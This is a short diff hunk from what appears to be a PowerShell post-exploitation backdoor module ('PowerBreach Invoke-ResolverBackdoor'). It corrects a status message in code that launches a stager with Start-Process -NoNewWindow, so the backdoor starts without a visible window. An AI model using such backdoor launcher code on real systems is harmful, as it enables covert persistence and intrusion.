@@ -112,7 +112,7 @@ Invoke-ResolverBackdoor"""
         parts = stager_code.split(" ")
 
         # set up the start-process command so no new windows appears
-        script = "Start-Process -NoNewWindow -FilePath '{}' -ArgumentList '{}'; 'PowerBreach Invoke-EventLogBackdoor started'".format(
+        script = "Start-Process -NoNewWindow -FilePath '{}' -ArgumentList '{}'; 'PowerBreach Invoke-ResolverBackdoor started'".format(
             parts[0], " ".join(parts[1:])
         )
 
